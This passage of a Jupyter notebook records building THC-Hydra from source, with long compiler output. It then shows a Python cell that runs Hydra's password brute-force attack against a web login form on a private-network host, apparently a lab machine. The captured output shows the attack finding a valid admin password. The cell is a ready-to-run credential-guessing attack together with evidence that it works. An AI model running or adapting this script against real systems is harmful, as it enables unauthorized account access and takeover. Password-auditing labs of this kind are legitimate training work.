      "cc -I. -O3 -g -fcommon -Wno-deprecated-declarations -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro -Wl,--allow-multiple-definition -g -D_GNU_SOURCE -c hydra-vmauthd.c -DLIBOPENSSL -DLIBNCURSES -DHAVE_PCRE -DHAVE_ZLIB -DHAVE_MATH_H  -I/usr/include -I/usr/include\n",
      "cc -I. -O3 -g -fcommon -Wno-deprecated-declarations -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro -Wl,--allow-multiple-definition -g -D_GNU_SOURCE -c hydra-asterisk.c -DLIBOPENSSL -DLIBNCURSES -DHAVE_PCRE -DHAVE_ZLIB -DHAVE_MATH_H  -I/usr/include -I/usr/include\n",
      "cc -I. -O3 -g -fcommon -Wno-deprecated-declarations -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro -Wl,--allow-multiple-definition -g -D_GNU_SOURCE -c hydra-firebird.c -DLIBOPENSSL -DLIBNCURSES -DHAVE_PCRE -DHAVE_ZLIB -DHAVE_MATH_H  -I/usr/include -I/usr/include\n",
      "cc -I. -O3 -g -fcommon -Wno-deprecated-declarations -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro -Wl,--allow-multiple-definition -g -D_GNU_SOURCE -c hydra-afp.c -DLIBOPENSSL -DLIBNCURSES -DHAVE_PCRE -DHAVE_ZLIB -DHAVE_MATH_H  -I/usr/include -I/usr/include\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "clang: warning: -Wl,-z,now: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,-z,relro: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,--allow-multiple-definition: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: argument unused during compilation: '-pie' [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,-z,now: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,-z,relro: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,--allow-multiple-definition: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: argument unused during compilation: '-pie' [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,-z,now: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,-z,relro: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,--allow-multiple-definition: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: argument unused during compilation: '-pie' [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,-z,now: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,-z,relro: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,--allow-multiple-definition: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: argument unused during compilation: '-pie' [-Wunused-command-line-argument]\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "cc -I. -O3 -g -fcommon -Wno-deprecated-declarations -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro -Wl,--allow-multiple-definition -g -D_GNU_SOURCE -c hydra-ncp.c -DLIBOPENSSL -DLIBNCURSES -DHAVE_PCRE -DHAVE_ZLIB -DHAVE_MATH_H  -I/usr/include -I/usr/include\n",
      "cc -I. -O3 -g -fcommon -Wno-deprecated-declarations -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro -Wl,--allow-multiple-definition -g -D_GNU_SOURCE -c hydra-http-proxy.c -DLIBOPENSSL -DLIBNCURSES -DHAVE_PCRE -DHAVE_ZLIB -DHAVE_MATH_H  -I/usr/include -I/usr/include\n",
      "cc -I. -O3 -g -fcommon -Wno-deprecated-declarations -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro -Wl,--allow-multiple-definition -g -D_GNU_SOURCE -c hydra-http-form.c -DLIBOPENSSL -DLIBNCURSES -DHAVE_PCRE -DHAVE_ZLIB -DHAVE_MATH_H  -I/usr/include -I/usr/include\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "clang: warning: -Wl,-z,now: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,-z,relro: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,--allow-multiple-definition: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: argument unused during compilation: '-pie' [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,-z,now: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,-z,relro: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,--allow-multiple-definition: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: argument unused during compilation: '-pie' [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,-z,now: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,-z,relro: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,--allow-multiple-definition: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: argument unused during compilation: '-pie' [-Wunused-command-line-argument]\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "cc -I. -O3 -g -fcommon -Wno-deprecated-declarations -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro -Wl,--allow-multiple-definition -g -D_GNU_SOURCE -c hydra-irc.c -DLIBOPENSSL -DLIBNCURSES -DHAVE_PCRE -DHAVE_ZLIB -DHAVE_MATH_H  -I/usr/include -I/usr/include\n",
      "cc -I. -O3 -g -fcommon -Wno-deprecated-declarations -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro -Wl,--allow-multiple-definition -g -D_GNU_SOURCE -c hydra-redis.c -DLIBOPENSSL -DLIBNCURSES -DHAVE_PCRE -DHAVE_ZLIB -DHAVE_MATH_H  -I/usr/include -I/usr/include\n",
      "cc -I. -O3 -g -fcommon -Wno-deprecated-declarations -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro -Wl,--allow-multiple-definition -g -D_GNU_SOURCE -c hydra-rdp.c -DLIBOPENSSL -DLIBNCURSES -DHAVE_PCRE -DHAVE_ZLIB -DHAVE_MATH_H  -I/usr/include -I/usr/include\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "clang: warning: -Wl,-z,now: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,-z,relro: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,--allow-multiple-definition: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: argument unused during compilation: '-pie' [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,-z,now: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,-z,relro: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,--allow-multiple-definition: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: argument unused during compilation: '-pie' [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,-z,now: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,-z,relro: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,--allow-multiple-definition: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: argument unused during compilation: '-pie' [-Wunused-command-line-argument]\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "cc -I. -O3 -g -fcommon -Wno-deprecated-declarations -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro -Wl,--allow-multiple-definition -g -D_GNU_SOURCE -c hydra-adam6500.c -DLIBOPENSSL -DLIBNCURSES -DHAVE_PCRE -DHAVE_ZLIB -DHAVE_MATH_H  -I/usr/include -I/usr/include\n",
      "cc -I. -O3 -g -fcommon -Wno-deprecated-declarations -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro -Wl,--allow-multiple-definition -g -D_GNU_SOURCE -c hydra-rtsp.c -DLIBOPENSSL -DLIBNCURSES -DHAVE_PCRE -DHAVE_ZLIB -DHAVE_MATH_H  -I/usr/include -I/usr/include\n",
      "cc -I. -O3 -g -fcommon -Wno-deprecated-declarations -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro -Wl,--allow-multiple-definition -g -D_GNU_SOURCE -c hydra-rpcap.c -DLIBOPENSSL -DLIBNCURSES -DHAVE_PCRE -DHAVE_ZLIB -DHAVE_MATH_H  -I/usr/include -I/usr/include\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "clang: warning: -Wl,-z,now: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,-z,relro: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,--allow-multiple-definition: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: argument unused during compilation: '-pie' [-Wunused-command-line-argument]\n",
      "hydra-adam6500.c:31:21: warning: passing 'unsigned char [300]' to parameter of type 'char *' converts between pointers to integer types where one is of the unique plain 'char' type and the other is not [-Wpointer-sign]\n",
      "  if (hydra_send(s, buffer, sizeof(adam6500_req1), 0) < 0)\n",
      "                    ^~~~~~\n",
      "./hydra-mod.h:38:49: note: passing argument to parameter 'buf' here\n",
      "extern int32_t hydra_send(int32_t socket, char *buf, uint32_t size, int32_t options);\n",
      "                                                ^\n",
      "hydra-adam6500.c:35:23: warning: passing 'unsigned char [12]' to parameter of type 'char *' converts between pointers to integer types where one is of the unique plain 'char' type and the other is not [-Wpointer-sign]\n",
      "    if (hydra_send(s, adam6500_req2, sizeof(adam6500_req2), 0) < 0)\n",
      "                      ^~~~~~~~~~~~~\n",
      "./hydra-mod.h:38:49: note: passing argument to parameter 'buf' here\n",
      "extern int32_t hydra_send(int32_t socket, char *buf, uint32_t size, int32_t options);\n",
      "                                                ^\n",
      "2 warnings generated.\n",
      "clang: warning: -Wl,-z,now: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,-z,relro: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,--allow-multiple-definition: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: argument unused during compilation: '-pie' [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,-z,now: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,-z,relro: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,--allow-multiple-definition: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: argument unused during compilation: '-pie' [-Wunused-command-line-argument]\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "cc -I. -O3 -g -fcommon -Wno-deprecated-declarations -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro -Wl,--allow-multiple-definition -g -D_GNU_SOURCE -c hydra-radmin2.c -DLIBOPENSSL -DLIBNCURSES -DHAVE_PCRE -DHAVE_ZLIB -DHAVE_MATH_H  -I/usr/include -I/usr/include\n",
      "cc -I. -O3 -g -fcommon -Wno-deprecated-declarations -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro -Wl,--allow-multiple-definition -g -D_GNU_SOURCE -c crc32.c -DLIBOPENSSL -DLIBNCURSES -DHAVE_PCRE -DHAVE_ZLIB -DHAVE_MATH_H  -I/usr/include -I/usr/include\n",
      "cc -I. -O3 -g -fcommon -Wno-deprecated-declarations -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro -Wl,--allow-multiple-definition -g -D_GNU_SOURCE -c d3des.c -DLIBOPENSSL -DLIBNCURSES -DHAVE_PCRE -DHAVE_ZLIB -DHAVE_MATH_H  -I/usr/include -I/usr/include\n",
      "cc -I. -O3 -g -fcommon -Wno-deprecated-declarations -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro -Wl,--allow-multiple-definition -g -D_GNU_SOURCE -c bfg.c -DLIBOPENSSL -DLIBNCURSES -DHAVE_PCRE -DHAVE_ZLIB -DHAVE_MATH_H  -I/usr/include -I/usr/include\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "clang: warning: -Wl,-z,now: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,-z,relro: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,--allow-multiple-definition: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: argument unused during compilation: '-pie' [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,-z,now: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,-z,relro: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,--allow-multiple-definition: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: argument unused during compilation: '-pie' [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,-z,now: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,-z,relro: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,--allow-multiple-definition: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: argument unused during compilation: '-pie' [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,-z,now: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,-z,relro: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,--allow-multiple-definition: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: argument unused during compilation: '-pie' [-Wunused-command-line-argument]\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "cc -I. -O3 -g -fcommon -Wno-deprecated-declarations -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro -Wl,--allow-multiple-definition -g -D_GNU_SOURCE -c ntlm.c -DLIBOPENSSL -DLIBNCURSES -DHAVE_PCRE -DHAVE_ZLIB -DHAVE_MATH_H  -I/usr/include -I/usr/include\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "clang: warning: -Wl,-z,now: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,-z,relro: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,--allow-multiple-definition: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: argument unused during compilation: '-pie' [-Wunused-command-line-argument]\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "cc -I. -O3 -g -fcommon -Wno-deprecated-declarations -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro -Wl,--allow-multiple-definition -g -D_GNU_SOURCE -c sasl.c -DLIBOPENSSL -DLIBNCURSES -DHAVE_PCRE -DHAVE_ZLIB -DHAVE_MATH_H  -I/usr/include -I/usr/include\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "clang: warning: -Wl,-z,now: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,-z,relro: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,--allow-multiple-definition: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: argument unused during compilation: '-pie' [-Wunused-command-line-argument]\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "cc -I. -O3 -g -fcommon -Wno-deprecated-declarations -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro -Wl,--allow-multiple-definition -g -D_GNU_SOURCE -c hmacmd5.c -DLIBOPENSSL -DLIBNCURSES -DHAVE_PCRE -DHAVE_ZLIB -DHAVE_MATH_H  -I/usr/include -I/usr/include\n",
      "cc -I. -O3 -g -fcommon -Wno-deprecated-declarations -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro -Wl,--allow-multiple-definition -g -D_GNU_SOURCE -c hydra-mod.c -DLIBOPENSSL -DLIBNCURSES -DHAVE_PCRE -DHAVE_ZLIB -DHAVE_MATH_H  -I/usr/include -I/usr/include\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "clang: warning: -Wl,-z,now: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,-z,relro: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,--allow-multiple-definition: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: argument unused during compilation: '-pie' [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,-z,now: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,-z,relro: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,--allow-multiple-definition: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: argument unused during compilation: '-pie' [-Wunused-command-line-argument]\n",
      "hydra-mod.c:927:21: warning: passing 'char *' to parameter of type 'unsigned char *' converts between pointers to integer types where one is of the unique plain 'char' type and the other is not [-Wpointer-sign]\n",
      "    hydra_dump_data(buf, ret, text);\n",
      "                    ^~~\n",
      "./hydra-mod.h:47:44: note: passing argument to parameter 'buf' here\n",
      "extern void hydra_dump_data(unsigned char *buf, int32_t len, char *text);\n",
      "                                           ^\n",
      "hydra-mod.c:943:25: warning: passing 'char *' to parameter of type 'unsigned char *' converts between pointers to integer types where one is of the unique plain 'char' type and the other is not [-Wpointer-sign]\n",
      "        hydra_dump_data(buf, ret, text);\n",
      "                        ^~~\n",
      "./hydra-mod.h:47:44: note: passing argument to parameter 'buf' here\n",
      "extern void hydra_dump_data(unsigned char *buf, int32_t len, char *text);\n",
      "                                           ^\n",
      "hydra-mod.c:949:23: warning: passing 'char *' to parameter of type 'unsigned char *' converts between pointers to integer types where one is of the unique plain 'char' type and the other is not [-Wpointer-sign]\n",
      "      hydra_dump_data(buf, ret, text);\n",
      "                      ^~~\n",
      "./hydra-mod.h:47:44: note: passing argument to parameter 'buf' here\n",
      "extern void hydra_dump_data(unsigned char *buf, int32_t len, char *text);\n",
      "                                           ^\n",
      "hydra-mod.c:1005:25: warning: passing 'char *' to parameter of type 'unsigned char *' converts between pointers to integer types where one is of the unique plain 'char' type and the other is not [-Wpointer-sign]\n",
      "        hydra_dump_data(buff, got, pid);\n",
      "                        ^~~~\n",
      "./hydra-mod.h:47:44: note: passing argument to parameter 'buf' here\n",
      "extern void hydra_dump_data(unsigned char *buf, int32_t len, char *text);\n",
      "                                           ^\n",
      "hydra-mod.c:1039:21: warning: passing 'char *' to parameter of type 'unsigned char *' converts between pointers to integer types where one is of the unique plain 'char' type and the other is not [-Wpointer-sign]\n",
      "    hydra_dump_data(buf, size, text);\n",
      "                    ^~~\n",
      "./hydra-mod.h:47:44: note: passing argument to parameter 'buf' here\n",
      "extern void hydra_dump_data(unsigned char *buf, int32_t len, char *text);\n",
      "                                           ^\n",
      "hydra-mod.c:1300:22: warning: passing 'const char *' to parameter of type 'PCRE2_SPTR8' (aka 'const unsigned char *') converts between pointers to integer types where one is of the unique plain 'char' type and the other is not [-Wpointer-sign]\n",
      "  re = pcre2_compile(regex, PCRE2_ZERO_TERMINATED, PCRE2_CASELESS | PCRE2_DOTALL, &error_code, &error_offset, NULL);\n",
      "                     ^~~~~\n",
      "/usr/include/pcre2.h:935:1: note: passing argument to parameter here\n",
      "PCRE2_TYPES_STRUCTURES_AND_FUNCTIONS\n",
      "^\n",
      "/usr/include/pcre2.h:924:31: note: expanded from macro 'PCRE2_TYPES_STRUCTURES_AND_FUNCTIONS'\n",
      "PCRE2_MATCH_CONTEXT_FUNCTIONS \\\n",
      "                              ^\n",
      "/usr/include/pcre2.h:650:28: note: expanded from macro '\\\n",
      "PCRE2_COMPILE_FUNCTIONS'\n",
      "  *pcre2_compile(PCRE2_SPTR, PCRE2_SIZE, uint32_t, int *, PCRE2_SIZE *, \\\n",
      "                           ^\n",
      "hydra-mod.c:1307:24: warning: passing 'char *' to parameter of type 'PCRE2_SPTR8' (aka 'const unsigned char *') converts between pointers to integer types where one is of the unique plain 'char' type and the other is not [-Wpointer-sign]\n",
      "  rc = pcre2_match(re, str, PCRE2_ZERO_TERMINATED, 0, 0, match_data, NULL);\n",
      "                       ^~~\n",
      "/usr/include/pcre2.h:935:1: note: passing argument to parameter here\n",
      "PCRE2_TYPES_STRUCTURES_AND_FUNCTIONS\n",
      "^\n",
      "/usr/include/pcre2.h:926:30: note: expanded from macro 'PCRE2_TYPES_STRUCTURES_AND_FUNCTIONS'\n",
      "PCRE2_PATTERN_INFO_FUNCTIONS \\\n",
      "                             ^\n",
      "/usr/include/pcre2.h:682:45: note: expanded from macro '\\\n",
      "PCRE2_MATCH_FUNCTIONS'\n",
      "  pcre2_match(const pcre2_code *, PCRE2_SPTR, PCRE2_SIZE, PCRE2_SIZE, \\\n",
      "                                            ^\n",
      "7 warnings generated.\n",
      "clang: warning: -Wl,-z,now: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,-z,relro: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,--allow-multiple-definition: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: argument unused during compilation: '-pie' [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,-z,now: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,-z,relro: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,--allow-multiple-definition: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: argument unused during compilation: '-pie' [-Wunused-command-line-argument]\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "cc -I. -O3 -g -fcommon -Wno-deprecated-declarations -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro -Wl,--allow-multiple-definition -g -D_GNU_SOURCE -c hydra-time.c -DLIBOPENSSL -DLIBNCURSES -DHAVE_PCRE -DHAVE_ZLIB -DHAVE_MATH_H  -I/usr/include -I/usr/include\n",
      "cc -I. -O3 -g -fcommon -Wno-deprecated-declarations -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro -Wl,--allow-multiple-definition -g -D_GNU_SOURCE -c hydra-smb2.c -DLIBOPENSSL -DLIBNCURSES -DHAVE_PCRE -DHAVE_ZLIB -DHAVE_MATH_H  -I/usr/include -I/usr/include\n",
      "cc -I. -O3 -g -fcommon -Wno-deprecated-declarations -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro -Wl,--allow-multiple-definition -lm -g -D_GNU_SOURCE  -o hydra  hydra.c hydra-vnc.o hydra-pcnfs.o hydra-rexec.o hydra-nntp.o hydra-socks5.o hydra-telnet.o hydra-cisco.o hydra-http.o hydra-ftp.o hydra-imap.o hydra-pop3.o hydra-smb.o hydra-icq.o hydra-cisco-enable.o hydra-ldap.o hydra-memcached.o hydra-mongodb.o hydra-mysql.o hydra-mssql.o hydra-cobaltstrike.o hydra-xmpp.o hydra-http-proxy-urlenum.o hydra-snmp.o hydra-cvs.o hydra-smtp.o hydra-smtp-enum.o hydra-sapr3.o hydra-ssh.o hydra-sshkey.o hydra-teamspeak.o hydra-postgres.o hydra-rsh.o hydra-rlogin.o hydra-oracle-listener.o hydra-svn.o hydra-pcanywhere.o hydra-sip.o hydra-oracle-sid.o hydra-oracle.o hydra-vmauthd.o hydra-asterisk.o hydra-firebird.o hydra-afp.o hydra-ncp.o hydra-http-proxy.o hydra-http-form.o hydra-irc.o hydra-redis.o hydra-rdp.o hydra-s7-300.c hydra-adam6500.o hydra-rtsp.o hydra-rpcap.o hydra-radmin2.o crc32.o d3des.o bfg.o ntlm.o sasl.o hmacmd5.o hydra-mod.o hydra-time.o hydra-smb2.o -lm -lz -lcurses -lssl -lpcre2-8 -lcrypto -L/usr/lib -L/usr/local/lib -L/lib -L/lib/x86_64-linux-gnu -I/usr/include -I/usr/include -DLIBOPENSSL -DLIBNCURSES -DHAVE_PCRE -DHAVE_ZLIB -DHAVE_MATH_H \n",
      "\n",
      "If men could get pregnant, abortion would be a sacrament\n",
      "\n",
      "\n",
      "Now type make install\n",
      "Hydra v9.6dev (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\n",
      "\n",
      "Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-06-21 23:57:31\n",
      "[DATA] max 16 tasks per 1 server, overall 16 tasks, 1000000 login tries (l:1/p:1000000), ~62500 tries per task\n",
      "[DATA] attacking http-get-form://192.168.56.101:80/index.php:page=signin&username=^USER^&password=^PASS^&Login=Login:F=images/WrongAnswer.gif\n",
      "[80][http-get-form] host: 192.168.56.101   login: admin   password: shadow\n",
      "[STATUS] attack finished for 192.168.56.101 (valid pair found)\n",
      "1 of 1 target successfully completed, 1 valid password found\n",
      "Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-06-21 23:57:38\n"
     ]
    }
   ],
   "source": [
    "import os\n",
    "import subprocess\n",
    "\n",
    "def install_hydra():\n",
    "    os.system(\"git clone https://github.com/vanhauser-thc/thc-hydra.git\")\n",
    "    \n",
    "    os.chdir(\"thc-hydra\")\n",
    "    \n",
    "    os.system(\"./configure\")\n",
    "    \n",
    "    os.system(\"make\")\n",
    "\n",
    "def run_hydra_command(command):\n",
    "    os.system(command)\n",
    "\n",
    "if __name__ == \"__main__\":\n",
    "    install_hydra()\n",
    "    run_hydra_command(\"./hydra -l admin -P ../passwords/password.txt -F -o hydra.log 192.168.56.101 http-get-form '/index.php:page=signin&username=^USER^&password=^PASS^&Login=Login:F=images/WrongAnswer.gif'\")\n",
    "    "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "13dd196d-d3b3-4cab-8097-8ec3f3bdee03",
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "715e74f7-4d42-4460-982d-073de92f0d79",
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "61c1eceb-b1d6-4a83-854f-eb3dd9bde665",
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b08b3847-d0f2-4595-84d8-9831b8ca50ea",
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f70b9854-372e-4392-9e94-31a9221418dc",
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "1bb597b5-31be-49e8-84dc-9ef4493dbe1e",
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "2ee2bb14-1f9e-4702-a857-43aed5b12168",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.10.12"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
